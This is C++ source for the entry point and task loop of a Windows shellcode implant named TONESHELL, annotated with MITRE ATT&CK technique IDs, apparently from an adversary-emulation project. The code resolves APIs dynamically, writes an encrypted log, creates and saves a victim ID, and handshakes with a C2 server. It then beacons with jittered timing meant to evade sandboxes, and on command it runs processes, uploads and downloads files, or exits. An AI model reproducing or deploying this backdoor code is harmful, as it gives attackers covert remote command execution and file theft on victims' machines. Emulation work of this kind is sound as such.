#include "shellcode.hpp"
#include "comms.hpp"
#include "logger.hpp"
#include "shellcode_util.hpp"
#include "util.hpp"
#include "exec.hpp"
#include "prng.hpp"
#include <al/al.hpp>
#include <intrin.h>
#include <string_view>

#define HEAP_SIZE 1024*1024 // 1MB

using namespace al;

void PerformTaskLoop(sh_context* ctx, client_message* msg_buf, server_response* resp_buf);

/*
 * entry:
 *      About:
 *          Main shellcode entry point. Handles setting up appropriate context
 *          structures, initializing the logger, resolving APIs, allocating memory,
 *          and handling C2 comms and tasking.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
 *          T1082: System Information Discovery
 */
extern "C"
unsigned int entry() {
    sh_context ctx;
    pi_memset(&ctx, 0, sizeof(ctx));

    HANDLE h_heap = NULL;
    LPVOID client_msg_buf = NULL;
    LPVOID server_resp_buf = NULL;
    ctx.command_buf = NULL;

    DWORD result = FetchFunctions(&(ctx.fp));
    if (result != ERROR_SUCCESS) {
        return result;
    }

    // Start logger
    result = AesLogger::InitializeLogger(&(ctx.fp.shared_fp), XOR_MACRO(WIDEN(SH_LOG_FILE)), ENCRYPTED_LOGGING, &(ctx.log_ctx));
    if (result != ERROR_SUCCESS) {
        return result;
    }

    AesLogger::LogInfo(&(ctx.log_ctx), "============================="_xor);
    AesLogger::LogInfo(&(ctx.log_ctx), "Initialized payload logger."_xor);
    AesLogger::LogInfo(&(ctx.log_ctx), "============================="_xor);

    do {
        // Get current hostname for C2 communications
        result = GetHostname(&ctx);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx.log_ctx), "Failed to get hostname. Error code: %d"_xor, result);
            break;
        }
        AesLogger::LogInfo(&(ctx.log_ctx), "Retrieved hostname: %s"_xor, ctx.hostname);

        // Fetch victim ID
        result = GenerateNewVictimID(&ctx);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx.log_ctx), "Failed to generate victim ID. Error code: %d"_xor, result);
            break;
        }
        AesLogger::LogInfo(
            &(ctx.log_ctx),
            "Generated victim ID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X"_xor,
            ctx.victim_id[0],
            ctx.victim_id[1],
            ctx.victim_id[2],
            ctx.victim_id[3],
            ctx.victim_id[4],
            ctx.victim_id[5],
            ctx.victim_id[6],
            ctx.victim_id[7],
            ctx.victim_id[8],
            ctx.victim_id[9],
            ctx.victim_id[10],
            ctx.victim_id[11],
            ctx.victim_id[12],
            ctx.victim_id[13],
            ctx.victim_id[14],
            ctx.victim_id[15]
        );

        // Write victim ID to disk
        result = SaveVictimID(&ctx);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx.log_ctx), "Failed to save victim ID. Error code: %d"_xor, result);
            break;
        } else {
            AesLogger::LogInfo(&(ctx.log_ctx), "Saved victim ID on disk."_xor);
        }

        // Connect to C2 server
        ctx.comms_socket = INVALID_SOCKET;

        // Set up buffers to use for client and server messages and command strings
        h_heap = ctx.fp.shared_fp.fp_HeapCreate(0, HEAP_SIZE, HEAP_SIZE);
        if (h_heap == NULL) {
            result = ctx.fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(&(ctx.log_ctx), "Failed to create heap. Error code: %d"_xor, result);
            break;
        }

        client_msg_buf = ctx.fp.shared_fp.fp_HeapAlloc(h_heap, HEAP_ZERO_MEMORY, sizeof(client_message));
        if (client_msg_buf == NULL) {
            result = FAIL_HEAP_ALLOCATION;
            AesLogger::LogError(&(ctx.log_ctx), "Failed to create client message buffer."_xor);
            break;
        }

        server_resp_buf = ctx.fp.shared_fp.fp_HeapAlloc(h_heap, HEAP_ZERO_MEMORY, sizeof(server_response));
        if (server_resp_buf == NULL) {
            result = FAIL_HEAP_ALLOCATION;
            AesLogger::LogError(&(ctx.log_ctx), "Failed to create server response buffer."_xor);
            break;
        }

        ctx.command_buf = reinterpret_cast<wchar_t*>(ctx.fp.shared_fp.fp_HeapAlloc(h_heap, HEAP_ZERO_MEMORY, (MAX_CMD_LEN + 1)*sizeof(wchar_t)));
        if (ctx.command_buf == NULL) {
            result = FAIL_HEAP_ALLOCATION;
            AesLogger::LogError(&(ctx.log_ctx), "Failed to create command string buffer."_xor);
            break;
        }

        AesLogger::LogDebug(&(ctx.log_ctx), "Created heap and buffers."_xor);

        result = InitializeComms(&ctx);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx.log_ctx), "Failed to initialze comms. Error code: %d"_xor, result);
            break;
        }
        AesLogger::LogDebug(&(ctx.log_ctx), "Initialized comms structures."_xor);

        result = PerformHandshake(
            &ctx,
            reinterpret_cast<client_message*>(client_msg_buf),
            reinterpret_cast<server_response*>(server_resp_buf)
        );
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx.log_ctx), "Handshake failure. Error code: %d"_xor, result);
            break;
        }
        AesLogger::LogSuccess(&(ctx.log_ctx), "Handshake success."_xor);

        // Request and perform tasks
        PerformTaskLoop(
            &ctx,
            reinterpret_cast<client_message*>(client_msg_buf),
            reinterpret_cast<server_response*>(server_resp_buf)
        );
        result = ERROR_SUCCESS;
    } while (false);

    AesLogger::LogDebug(&(ctx.log_ctx), "Performing cleanup."_xor);
    if (client_msg_buf != NULL) {
        ctx.fp.shared_fp.fp_HeapFree(h_heap, 0, client_msg_buf);
    }

    if (server_resp_buf != NULL) {
        ctx.fp.shared_fp.fp_HeapFree(h_heap, 0, server_resp_buf);
    }

    if (ctx.command_buf != NULL) {
        ctx.fp.shared_fp.fp_HeapFree(h_heap, 0, ctx.command_buf);
    }

    if (h_heap != NULL) {
        ctx.fp.shared_fp.fp_HeapDestroy(h_heap);
    }

    CommsCleanup(&ctx);
    AesLogger::CloseLogger(&(ctx.log_ctx));
    return result;
}

/*
 * ComputeJitter:
 *      About:
 *          Returns a pseudo-random sleep duration from the Active or Idle bucket.
 *          Active bucket (1-3s) is used when the server just sent a real task;
 *          Idle bucket (5-30s) is used for keep-alive beacons when no task is pending.
 *          Values are configured via CMake cache variables at build time.
 *      MITRE ATT&CK Techniques:
 *          T1029 — Scheduled Transfer (adaptive jitter)
 *          T1497.003 — Virtualization/Sandbox Evasion: Time Based Evasion
 */
static uint32_t ComputeJitter(xorshift64_state* p, bool active) {
    if (active) {
        return TONESHELL_JITTER_ACTIVE_MIN_MS
             + (uint32_t)(xorshift64_next(p) % (TONESHELL_JITTER_ACTIVE_MAX_MS - TONESHELL_JITTER_ACTIVE_MIN_MS));
    }
    return TONESHELL_JITTER_IDLE_MIN_MS
         + (uint32_t)(xorshift64_next(p) % (TONESHELL_JITTER_IDLE_MAX_MS - TONESHELL_JITTER_IDLE_MIN_MS));
}

/*
 * PerformTaskLoop:
 *      About:
 *          Repeatedly beacons to the C2 server to request tasking
 *          and processes C2 responses. Uses 2-tier adaptive jitter
 *          to vary beacon cadence: Active (1-3s) when a real task
 *          was just received, Idle (5-30s) for keep-alive beacons.
 *          An immediate follow-up beacon (delay=0) fires after
 *          task completion to create burst behavior.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *          T1029: Scheduled Transfer
 *          T1497.003: Virtualization/Sandbox Evasion: Time Based Evasion
 */
void PerformTaskLoop(sh_context* ctx, client_message* msg_buf, server_response* resp_buf) {
    DWORD result;
    xorshift64_state prng;
    uint64_t nextSend = 0;
    bool seeded = false;

    while (true) {
        if (!seeded) {
            uint64_t seed = __rdtsc() ^ ctx->fp.fp_GetTickCount64();
            xorshift64_seed(&prng, seed);
            seeded = true;
        }

        uint64_t now = ctx->fp.fp_GetTickCount64();
        if (nextSend > now) {
            uint64_t remaining = nextSend - now;
            ctx->fp.fp_Sleep((DWORD)remaining);
        }

        AesLogger::LogDebug(&(ctx->log_ctx), "Sending beacon."_xor);
        result = PerformBeacon(ctx, msg_buf, resp_buf);
        bool had_task = false;

        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx->log_ctx), "Beacon failure. Error code: %d"_xor, result);
            had_task = false;
        } else if (resp_buf->resp_type == RESP_TYPE_EXEC_CMD) {
            AesLogger::LogDebug(&(ctx->log_ctx), "Received process execution instruction."_xor);
            result = PerformExecTask(ctx, msg_buf, resp_buf, reinterpret_cast<task_command_data*>(resp_buf->data));
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&(ctx->log_ctx), "Process execution task failure. Error code: %d"_xor, result);
            }
            had_task = true;
        } else if (resp_buf->resp_type == RESP_TYPE_FILE_DOWNLOAD) {
            AesLogger::LogDebug(&(ctx->log_ctx), "Received file download instruction."_xor);
            result = PerformFileDownloadTask(ctx, msg_buf, resp_buf);
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&(ctx->log_ctx), "File download task failure. Error code: %d"_xor, result);
            } else {
                AesLogger::LogInfo(&(ctx->log_ctx), "Successfully downloaded file."_xor);
            }
            had_task = true;
        } else if (resp_buf->resp_type == RESP_TYPE_FILE_UPLOAD) {
            AesLogger::LogDebug(&(ctx->log_ctx), "Received file upload instruction."_xor);
            task_start_upload_data task_data;
            pi_memcpy(&task_data, &(resp_buf->data), sizeof(task_start_upload_data));
            result = PerformFileUploadTask(ctx, msg_buf, resp_buf, &task_data);
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&(ctx->log_ctx), "File upload task failure. Error code: %d"_xor, result);
            } else {
                AesLogger::LogInfo(&(ctx->log_ctx), "Successfully uploaded file."_xor);
            }
            had_task = true;
        } else if (resp_buf->resp_type == RESP_TYPE_IDLE) {
            AesLogger::LogDebug(&(ctx->log_ctx), "Received idle instruction."_xor);
            had_task = false;
        } else if (resp_buf->resp_type == RESP_TYPE_TERMINATE) {
            AesLogger::LogDebug(&(ctx->log_ctx), "Received termination instruction."_xor);
            ctx->fp.fp_ExitProcess(0);
            return;
        } else if (resp_buf->resp_type == RESP_TYPE_RECONNECT) {
            AesLogger::LogDebug(&(ctx->log_ctx), "Received reconnect instruction from C2 server. Resending handshake."_xor);
            result = PerformHandshake(ctx, msg_buf, resp_buf);
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&(ctx->log_ctx), "Handshake failure. Error code: %d"_xor, result);
                break;
            }
            AesLogger::LogSuccess(&(ctx->log_ctx), "Reconnect success."_xor);
            had_task = true;
        } else {
            AesLogger::LogError(&(ctx->log_ctx), "Unsupported beacon response code: %d"_xor, resp_buf->resp_type);
            had_task = false;
        }

        if (had_task) {
            nextSend = 0;
        } else {
            nextSend = ctx->fp.fp_GetTickCount64() + ComputeJitter(&prng, false);
        }
    }
}
